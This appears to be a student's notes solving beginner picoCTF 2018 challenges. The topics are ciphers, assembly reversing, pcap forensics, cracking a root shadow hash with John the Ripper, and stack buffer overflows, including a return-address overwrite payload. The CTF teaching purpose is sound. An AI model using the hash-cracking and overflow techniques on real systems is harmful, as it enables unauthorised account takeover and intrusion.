0406 Training - picoCTF2018 筆記5
===

* [picoCTF 2018](https://2018game.picoctf.com/news)

---

## HEEEEEEERE'S Johnny! (Cryptography)


> Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process. Connect with nc 2018shell.picoctf.com 40157. Files can be found here: [passwd](https://2018shell.picoctf.com/static/7a017af70c0b86ab002896616376499e/passwd) [shadow](https://2018shell.picoctf.com/static/7a017af70c0b86ab002896616376499e/shadow).

0. 明顯是要我們crack root的帳號。

1. 先看看passwd
```
# passwd
root:x:0:0:root:/root:/bin/bash

# 1~7欄依序為：
# 登入名稱
# 加密的密碼(無x表示無密碼)
# user ID
# group ID
# 完整帳號名稱
# home directory
# default shell (usually set to /bin/bash)
```

2. 再看看shadow
```
# shadow
root:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:17770:0:99999:7:::

# 1~9欄依序為：
# 登入名稱
# 上次密碼變更日期(從1970.1.1起的天數)
# 兩次修改密碼間隔天數
# 兩次修改密碼間隔最多天數
# 密碼過期後，可登入修改密碼期限
# 帳號過期日期
# 保留欄位

# 加密的密碼具有固定格式：
#
# $id$salt$encrypted
#
# id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 
# salt表示密碼學中的Salt,系统隨機生成
# encrypted表示密碼的hash
```

3. John the Ripper破解
```bash
> john --wordlist=/usr/share/john/password.lst ./shadow
...
> john --show ./shadow 
root:password1:17770:0:99999:7:::

1 password hash cracked, 0 left
> nc 2018shell.picoctf.com 40157
Username: root
Password: password1
picoCTF{XXXXXXXXXXX}
```
* 參考資料
    * [Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
    * [Linux下的密码Hash——加密方式与破解方法的技术整理](https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/)
    * [Linux 的 /etc/shadow 檔案結構：儲存真實密碼的地方](https://blog.gtwang.org/linux/linux-etc-shadow-file-format/)

---

## admin panel (Forensics)

>We captured some [traffic](https://2018shell.picoctf.com/static/1a6db339e11fa100ef52d944edaa9612/data.pcap) logging into the admin panel, can you find the password?

在封包裡翻找一下，follow第68個封包的TCP stream，就會看到了
```
POST /login HTTP/1.1
Host: 192.168.3.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.3.128/
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=admin&password=picoCTF{XXXXXXXXXXX}
```

---

## assembly-0 (Reversing)

> What does asm0(0xaa,0xf2) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell.picoctf.com/static/5359d5442f2379ae9948dfeebe80d8f8/intro_asm_rev.S) located in the directory at /problems/assembly-0_2_485b2d48345b19addbeb06a36aabdc74.

0. 先看看Source
```
# intro_asm_rev.S

.intel_syntax noprefix
.bits 32

.global asm0

asm0:
        push    ebp
        mov     ebp,esp
        mov     eax,DWORD PTR [ebp+0x8]    # eax = [ebp+0x8]，[ebp+0x8]即第一個參數0xaa
        mov     ebx,DWORD PTR [ebp+0xc]    # ebx = [ebp+0xc]，[ebp+0xc即第二個參數0xf2
        mov     eax,ebx                    # eax = ebx
        mov     esp,ebp
        pop     ebp
        ret
```
1. 所以return的 eax = 0xf2

---

## environ (General Skills)

> Sometimes you have to configure environment variables before executing a program. Can you find the flag we've hidden in an environment variable on the shell server?

0. 在web shell裡玩玩
```
> env
> echo $FLAG
> echo $PATH
> evc
SECRET_FLAG=picoCTF{XXXXXXXXX}
```
1. 莫名奇妙就出現惹???

---

## buffer overflow 0 (Binary Exploitation)

> Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17 on the shell server. [Source](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln.c).

0. 先看看Source
```c
...
...
...
if (argc > 1) {
    vuln(argv[1]);
    f("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```

1. 所以要一個參數，直接overflow看看

```b
Ice1187@pico-2018-shell: ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{XXXXXXXXXXXXXXXXX}
```

---

## ertz (Cryptography)

> Here's another simple cipher for you where we made a bunch of substitutions. Can you decrypt it? Connect with nc 2018shell.picoctf.com 48487.

0. 先`nc`看看
```
-------------------------------------------------------------------------------
lbqkstup wysy rp hbms dctk - pmxpurumurbq_lrnwysp_tsy_pbcotxcy_lirckqicqn
-------------------------------------------------------------------------------
putuych, ncmfn xmle fmccrktq ltfy dsbf uwy putrswyti, xytsrqk t xbvc bd
ctuwys bq vwrlw t frssbs tqi t stzbs cth lsbppyi. t hyccbv isypprqkkbvq,
mqkrsicyi, vtp pmputrqyi kyquch xywrqi wrf bq uwy frci fbsqrqk trs. wy
wyci uwy xbvc tcbdu tqi rqubqyi:
...
...
```

1. 蠻明顯是替換式加密，直接詞頻分析
    * [quipqiup](https://quipqiup.com/)

```
congrats here is your flag - substitution_ciphers_are_sol?able_cdilgndlnp stately, ......
```

2. ?處猜測是v，solvable


---

## ssh-keyz (General Skills)

> As nice as it is to use our webshell, sometimes its helpful to connect directly to our machine. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. The flag is in the ssh banner which will be displayed when you login remotely with ssh to with your username.

* HINT
    * [pico2017 keyz](https://www.youtube.com/watch?v=3CN65ccfllU&list=PLJ_vkrXdcgH-lYlRV8O-kef2zWvoy79yP&index=4)

0. 本機shell:
```b
Ice1187: ssh-keygen -t rsa -C 'Ice1187'
Ice1187: cat /root/.ssh/id_rsa.pub
ssh-rsa ...... root@kali
```

1. webshell:
```b
> mkdir .ssh
> vim authorized_keys    # 將本機shell cat產生的所有內容貼進去
> chmod 600 ./.ssh/authorized_keys
```

2. 本機shell:
```b
Ice1187: ssh Ice1187@2018shell.picoctf.com
...
...
...
picoCTF{XXXXXXXX}
```

---

## Truly an Artist (Forensics)

> Can you help us find the flag in this [Meta-Material](https://2018shell.picoctf.com/static/a386ed9a7534702173762cf536dce121/2018.png)? You can also find the file in /problems/truly-an-artist_2_61a3ed7216130ab1c2b2872eeda81348.

0. 用Stegsolve打開 -> Analyse -> File format ，其中一行即為flag

---

## assembly-1 (Reversing)

> What does asm1(0xc8) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell.picoctf.com/static/88fdf76b0f4d3f3bf9eff14ef98bbaa9/eq_asm_rev.S) located in the directory at /problems/assembly-1_4_99ac7ff5dfe75417ed616e35bfc2c023.

0. 看asm
```b
.intel_syntax noprefix
.bits 32
        
.global asm1

asm1:
        push    ebp
        mov     ebp,esp
        cmp     DWORD PTR [ebp+0x8],0x9a    # 0xc8 跟 0x9a 比較
        jg      part_a                      # Jump if Greater -> part_a 
        cmp     DWORD PTR [ebp+0x8],0x8
        jne     part_b
        mov     eax,DWORD PTR [ebp+0x8]
        add     eax,0x3
        jmp     part_d
part_a:
        cmp     DWORD PTR [ebp+0x8],0x2c    # 0xc8 跟 0x2c 比較
        jne     part_c                      # Jump if Not Equal -> part_c
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
part_b:
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
        cmp     DWORD PTR [ebp+0x8],0xc8
        jne     part_c
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
part_c:
        mov     eax,DWORD PTR [ebp+0x8]    # eax = 0xc8
        add     eax,0x3                    # eax = eax + 0x3 -> 0xcb
part_d:
        pop     ebp
        ret
```

---

## be-quick-or-be-dead-1 (Reversing)

> You find this when searching for some music, which leads you to [be-quick-or-be-dead-1](https://2018shell.picoctf.com/static/1a796b0425170aa031a6ad476c64bf75/be-quick-or-be-dead-1). Can you run it fast enough? You can also find the executable in /problems/be-quick-or-be-dead-1_1_d0d1dc1d01c7fd569eac77763d813c6f.

0. 下載檔案
```
$: scp Ice1187@2018shell.picoctf.com:/problems/.../be-quick-or-be-dead-1 .
```
1. run起來
```b
Ice1187: ./be-quick-or-be-dead-1 
Be Quick Or Be Dead 1
=====================

Calculating key...
You need a faster machine. Bye bye.
```

2. 用gdb試試看(畢竟是要慢)，就得flag(???
```b
Be Quick Or Be Dead 1
=====================

Calculating key...

.
Done calculating key
Printing flag:
picoCTF{XXXXXXXXXXXXXXX}
```
3. 根據`Program received signal SIGALRM, Alarm clock`的警示訊息，應該是運算超時，會自動跳出，但gdb可能擋掉了
    * [SIGALRM (wiki)](https://zh.wikipedia.org/wiki/SIGALRM): 電腦程式通常**使用SIGALRM作為長時間操作的超時訊號**，或提供一種隔一定時間間隔處理某些操作的方式。

3. 後續在<get_key>裡的<caculate_key>看到這段code，應該就是因為這個loop (是要算多久XD
```
<calculate_key+11>:	add    DWORD PTR [rbp-0x4],0x1
<calculate_key+15>:	cmp    DWORD PTR [rbp-0x4],0xe9a5972c
<calculate_key+22>:	jne    0x400711 <calculate_key+11>
```

---

## you can't see me (General)

> '...reading transmission... Y.O.U. .C.A.N.'.T. .S.E.E. .M.E. ...transmission ended...' Maybe something lies in /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f.

0. 就是一個叫做`.`的檔案，考妳用奇怪的方式讀它
```b
: ls -a
. . ..
: head .*
==> . <==
head: error reading '.': Is a directory

==> .   <==
picoCTFXXXXXXXXXXXXX}
head: cannot open '..' for reading: Permission denied
```

---

## What's My Name? (Forensics)
Say my name, say [my name](https://2018shell.picoctf.com/static/b7e6f97343b1e36e6f34f762e95dd819/myname.pcap).
* HINT: If you visited a website at an IP address, how does it know the name of the domain?

0. wireshark打開，UTP stream follow第43個的DNS封包，就會看到flag

1. 考DNS系統怎麼查詢domain name
    * [域名系統 DNS (wiki)](https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F)
    * 參考: [DNS的運作？](http://dns-learning.twnic.net.tw/dns/03opDNS.html)

---

## caesar cipher 2 (Cryptography)

> Can you help us decrypt this message? We believe it is a form of a caesar cipher. You can find the ciphertext in /problems/caesar-cipher-2_1_ac88f1b12e9dbca252d450d374c4a087 on the shell server.

0. 找不到好用的工具，直接自幹!!!
```cpp
#include <iostream>
#include <cstring>
using namespace std;

int main(){
  string table, cipher;
  printf("table: ");
  cin >> table;
  printf("cipher: ");
  cin >> cipher;
  for(int i = 0; i < table.length(); i++){
    printf("\n");
    for(int j =0; j < cipher.length(); j++){
      char c = cipher[j];
      for(int k=0; k < table.length(); k++)
        if(c == table[k]){
          char r = table[k+i];
          printf("%c", r);
          break;
        }
    }
  }    

   return 0;
} 
```

1. 自幹就過了(竟然還不用處理位移循環的問題 ._.)
```
: ./caeser_decoder 
table:  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
cipher: e^Xd8I;pX6ZhVGT8^E]:gHT_jHITVG:cITh:XJg:r

...
...
...
picoCTF{XXXXXXXXXX}
```

---

## blaise's cipher (Cryptography)

> My buddy Blaise told me he learned about this cool cipher invented by a guy also named Blaise! Can you figure out what it says? Connect with nc 2018shell.picoctf.com 46966.

0. 根據wiki，「維吉尼亞密碼在19世紀時被誤傳為是法國外交官布萊斯·德·維吉尼亞（==Blaise== De Vigenère）所創造，因此現在被稱為「維吉尼亞密碼」。」

1. 簡單觀察cipher，可以猜出它是Vigenere密碼的wiki介紹
```
# cipher
...
Goqmexy Gexslm zwtej yz rkulix yse hwzkks nivmpr (iwpaznyg zmp Vkwyas–Atgksprk htpnjc it 1918), 

# wiki
Gilbert Vernam tried to repair the broken cipher (creating the Vernam–Vigenère cipher in 1918), 
```

2. 直接丟工具解
    * [dcode](https://www.dcode.fr/vigenere-cipher)
    * 先`TRY TO DECRYPT AUTOMATICALLY (STATISTICAL ANALYSIS)`得Key = FLAG，再解

---

## buffer overflow 1 (Binary Exploitation)

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78 on the shell server. [Source](https://2018shell.picoctf.com/static/304de0741561b9f80c664ea941922b03/vuln.c).

0. 嘗試patch長度

```b
: python -c "print 'a'*44 + 'abcdef'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x64636261
Segmentation fault (core dumped)
```
1. 打開objdump，找到一個`<win>`function在`080485cb`
```b
080485cb <win>:
 80485cb:	55                   	push   ebp
 80485cc:	89 e5                	mov    ebp,esp
 80485ce:	83 ec 58             	sub    esp,0x58
```
2. 撰寫payload，得flag
```b
: python -c "print 'a'*44 + \xcb\x85\x04\x08'" | ./vuln

Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{XXXXXXXXXXXXX}Segmentation fault (core dumped)
```
* 參考
    * [Why is my stack buffer overflow exploit not working?](https://stackoverflow.com/questions/39732600/why-is-my-stack-buffer-overflow-exploit-not-working)

---

## hertz 2 (Cryptography)

> This flag has been encrypted with some kind of cipher, can you decrypt it? Connect with nc 2018shell.picoctf.com 12521.
 
```
Mwq dvcpg oehxy shl uvbjf hrqe mwq kiza nht.
C piy'm oqkcqrq mwcf cf fvpw iy qifa jehokqb cy Jcph.
Cm'f ikbhfm if cs C fhkrqn i jehokqb ikeqina!
Hgia, scyq. Wqeq'f mwq skit: 
jcphPMS{fvofmcmvmchy_pcjwqef_ieq_mhh_qifa_tbycocemyr}
```

0. 最後很明顯是flag，還是[詞頻分析](https://quipqiup.com/)
    * `jcphPMS = picoCTF`

---

## Mr. Robots (Web Exploitation)

> Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell.picoctf.com:10157 (link)

0. 看`robots.txt`

---




---

###### tags: `CTF` `Training` `picoCTF`



